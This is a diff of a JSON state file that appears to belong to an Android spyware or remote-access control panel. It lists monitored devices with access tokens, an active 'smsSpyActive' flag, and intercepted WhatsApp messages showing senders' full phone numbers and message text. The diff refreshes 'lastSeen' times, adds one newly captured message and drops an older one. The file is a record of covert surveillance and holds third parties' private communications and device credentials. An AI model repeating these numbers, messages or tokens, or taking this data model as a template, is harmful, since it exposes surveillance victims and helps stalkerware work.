@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777355684183,
+    "lastSeen": 1777355699135,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -474,7 +474,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777355684132,
+    "lastSeen": 1777355699137,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -490,6 +490,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 838-7699-8241",
+        "content": "Sbr",
+        "time": "28/04 12:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777355701279
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 838-7699-8241",
@@ -4481,14 +4489,6 @@
         "time": "27/04 20:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1777295882610
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 856-5985-6951",
-        "content": "+ delay 7 h - bind 7h lagi. Soal myaa",
-        "time": "27/04 20:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777295882489
       }
     ],
     "galleryPhotos": [],
